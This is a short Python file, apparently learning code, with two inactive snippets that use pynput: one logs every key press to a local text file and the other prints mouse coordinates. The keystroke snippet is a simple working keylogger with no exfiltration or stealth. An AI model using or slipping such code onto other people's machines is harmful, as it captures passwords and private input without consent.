'''
# listening to the keyboard
from pynput.keyboard import Listener

def writetofile(key):
    key_data = str(key)
    with open("log.txt", 'a') as f:
        f.write(key_data)

# upon the press of any key on the keyboard, the key will be sent to writetofile function
with Listener(on_press=writetofile) as l:
    # to join our key strokes
    l.join()
'''

'''
# listen to the mouse
from pynput.mouse import Listener

def writetofile(x, y):
    print("Postion of current mouse {}".format((x,y)))
    # with open("log.txt", 'a') as f:
    #     f.write(key_data)

# upon the movement of the mouse (x,y) will be sent to writetofile function
with Listener(on_move=writetofile) as l:
    # to join our mouse movements
    l.join()
'''